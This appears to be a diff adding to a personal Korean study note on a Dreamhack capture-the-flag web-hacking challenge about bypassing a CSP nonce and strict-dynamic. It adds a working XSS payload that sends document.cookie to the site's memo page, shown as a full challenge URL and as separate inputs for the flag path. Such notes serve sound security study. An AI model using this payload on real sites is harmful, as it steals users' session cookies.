@@ -1,3 +1,12 @@
+#web-hacking
+# Payload
+```text
+http://host8.dreamhack.games:9600/vuln?param=<script id=name></script>#location.href='/memo?memo='+document.cookie//
+
+/flag 경로에 각각 다음을 입력
+<script id=name></script>
+location.href='/memo?memo='+document.cookie//
+```
 - nonce가 의미하는게 무엇인지 확인
 	- CSP 헤더 : 개발자 도구 - 네트워크 - 요청 - 헤더 - 응답 헤더 - Content-Security-Policy 맨 마지막 확인
 	- https://content-security-policy.com/strict-dynamic
